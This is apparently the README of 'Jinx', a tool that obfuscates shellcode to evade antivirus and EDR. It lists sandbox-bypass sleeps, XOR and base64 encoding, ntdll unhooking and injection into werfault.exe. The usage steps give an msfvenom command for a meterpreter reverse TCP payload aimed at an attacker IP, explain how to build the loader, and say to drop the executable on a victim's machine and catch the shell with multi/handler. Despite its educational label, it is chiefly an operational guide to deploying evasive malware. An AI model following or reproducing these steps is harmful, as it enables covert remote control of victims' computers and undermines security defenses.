# Jinx (For Educational Purposes Only)
## Shellcode obfuscation tool to avoid AV/EDR.
[![Python 3.10.4](https://img.shields.io/badge/Python-3.10.4-yellow.svg)](https://www.python.org/) [![C++ 14](https://img.shields.io/badge/C%2B%2B-14-blue)](https://visualstudio.microsoft.com/vs/features/cplusplus/) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

## Features
- Custom Sleep Function - to bypass sandbox
- Obfuscation - base64 encoding and xor encryption with randomly generated key
- DLL Unhooking - full unhook of ntdll.dll
- Process Injection - injecting the payload to werfault.exe

## Requirements
Jinx requires [Python3](https://www.python.org/) and a C++ compiler to run (we will be using [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/)).

## Usage
In this demonstration we will generate a shellcode using msfvenom in our kali machine:
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Attacker IP> LPORT=1337 -f raw -o shellcode
```

Next we will use the obfuscator.py tool to obfuscate the shellcode:
```bash
python3 obfuscator.py <Path to the shellcode>/shellcode
```
Our shellcode then be obfuscated and saved in - obfuscatedPayload.bin with the key - key.bin.

Open Visual Studio create a project and import the files as follow:

- Headers Files > right click > Add > Existing Item > (base64.h, ntdll.h, resource.h)
- Resource Files > right click > Add > Existing Item > (key.bin, obfuscatedPayload.bin)
- Source Files > right click > Add > Existing Item > (base64.cpp, main.cpp, ntdll.cpp)

Build The project and drop the executable on the victim's machine.

On the attacker's machine use metasploit's multi/handler on port 1337 and on the victim's machine execute Jinx.

## Authors and acknowledgment
[RonKon](https://github.com/RonKonis) - Development
<br>
[dkonis](https://github.com/dkonis) - Research & Development
<br>
[SheL3G](https://github.com/SheL3G) - Research

## License
Distributed under the MIT License. See LICENSE.txt for more information.
